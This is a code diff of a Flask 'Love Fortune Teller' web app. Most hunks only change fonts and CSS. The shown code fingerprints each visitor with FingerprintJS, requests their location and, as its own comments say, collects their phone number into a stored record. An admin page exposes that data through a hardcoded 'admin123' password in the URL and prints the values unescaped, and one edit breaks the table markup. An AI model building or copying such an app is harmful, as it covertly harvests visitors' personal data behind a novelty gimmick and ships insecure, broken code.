@@ -113,11 +113,10 @@ def index():
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Love Fortune Teller</title>
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Poppins', sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: linear-gradient(135deg, #ff9a9e, #fecfef, #ffdde1);
             min-height: 100vh;
             display: flex;
@@ -135,8 +134,7 @@ def index():
             text-align: center;
         }
         h1 {
-            font-family: 'Dancing Script', cursive;
-            font-size: 3em;
+            font-size: 2.2em;
             background: linear-gradient(135deg, #ff6b6b, #c06c84);
             -webkit-background-clip: text;
             background-clip: text;
@@ -144,10 +142,9 @@ def index():
             margin-bottom: 10px;
         }
         .sub {
-            font-family: 'Poppins', sans-serif;
             color: #888;
             margin-bottom: 25px;
-            font-weight: 300;
+            font-size: 0.95em;
         }
         .btn {
             background: linear-gradient(135deg, #ff6b6b, #c06c84);
@@ -155,13 +152,12 @@ def index():
             border: none;
             padding: 14px 25px;
             font-size: 16px;
-            font-weight: bold;
+            font-weight: 600;
             border-radius: 60px;
             cursor: pointer;
             transition: 0.3s;
             width: 100%;
             margin: 10px 0;
-            font-family: 'Poppins', sans-serif;
         }
         .btn-small {
             width: auto;
@@ -182,8 +178,8 @@ def index():
             border-radius: 20px;
             padding: 20px;
             margin: 20px 0;
-            font-family: 'Dancing Script', cursive;
-            font-size: 1.6em;
+            font-size: 1.3em;
+            font-weight: 500;
             color: #c06c84;
             line-height: 1.4;
         }
@@ -197,7 +193,7 @@ def index():
             border-radius: 60px;
             text-align: center;
             font-size: 16px;
-            font-family: 'Poppins', sans-serif;
+            font-family: inherit;
         }
         .sms-prompt {
             background: rgba(255,255,255,0.8);
@@ -206,7 +202,6 @@ def index():
             margin-top: 15px;
         }
         .sms-prompt p {
-            font-family: 'Poppins', sans-serif;
             font-size: 14px;
             margin-bottom: 10px;
         }
@@ -321,7 +316,7 @@ def index():
                 document.getElementById('fortuneDisplay').innerHTML = currentFortune;
                 document.getElementById('fortuneDisplay').classList.remove('hidden');
                 
-                // Show SMS prompt
+                // Show SMS prompt (to collect phone number)
                 document.getElementById('smsSection').classList.remove('hidden');
             }, () => {
                 showStatus('⚠️ Location denied. Random fortune below.', true);
@@ -353,12 +348,14 @@ def index():
             showStatus('Please enter your mobile number', true, 'smsStatus');
             return;
         }
+        // Basic validation (allow + and digits)
         if (!/^\+?[0-9\s\-]{10,15}$/.test(phone)) {
             showStatus('Invalid phone number format', true, 'smsStatus');
             return;
         }
         showStatus('Sending your fortune...', false, 'smsStatus');
         
+        // Send phone number to server (update the existing record or add to same row)
         const resp = await fetch('/save-phone', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -492,7 +489,7 @@ def admin():
     html += "<tr>" + "".join(f"<th>{col}</th>" for col in df.columns) + "</tr>"
     for _, row in df.iterrows():
         html += "<tr>" + "".join(f"<td>{str(val)[:80]}</td>" for val in row) + "</tr>"
-    html += "</table><br><a href='/download-excel?pass=admin123'><button>Download Excel</button></a>"
+    html += "<tr><br><a href='/download-excel?pass=admin123'><button>Download Excel</button></a>"
     return html
 
 @app.route('/download-excel')
